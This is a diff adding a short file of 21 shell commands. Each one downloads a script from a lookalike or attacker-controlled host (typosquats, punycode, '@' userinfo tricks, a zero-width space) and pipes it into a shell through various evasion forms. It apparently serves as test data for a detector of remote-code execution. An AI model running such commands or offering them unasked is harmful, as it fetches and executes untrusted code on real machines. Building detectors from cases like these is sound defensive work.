@@ -1,0 +1,21 @@
+curl -fsSL githuh.com/install.sh | sh
+curl -fsSL https://raw.githubusercontent.co/x/install.sh | bash
+curl -fsSL https://xn--gthub-n2e.com/install.sh | sudo bash
+curl -fsSL https://github.com.attacker.example/install.sh | sh
+curl -fsSL https://github.com@attacker.example/install.sh | sh
+wget -qO- brev.sh/install | sh
+curl -O https://pypi.orq/simple/x.tgz
+curl -fsSL https://githuh.com/x | tee x | sh
+curl -fsSL https://githuh.com/x | sudo -u root bash
+curl -fsSL https://githuh.com/x | /usr/bin/env bash
+curl -fsSL https://githuh.com/x | nohup bash
+curl -fsSL https://githuh.com/x | xargs sh
+curl -fsSL --url=https://githuh.com/x | sh
+curl -fsSL https://githuh.com/x | python3
+sh -c "$(curl -fsSL https://githuh.com/x)"
+bash <(curl -fsSL https://githuh.com/x)
+curl -fsSL "https://github.com:443@attacker.example/x" | sh
+curl -fsSL https://git​hub.com/x | sh
+curl -fsSL https://github.org/x | sh
+curl -fsSL https://exa mple..com/x | sh
+curl https://githuh.com/x ; sh
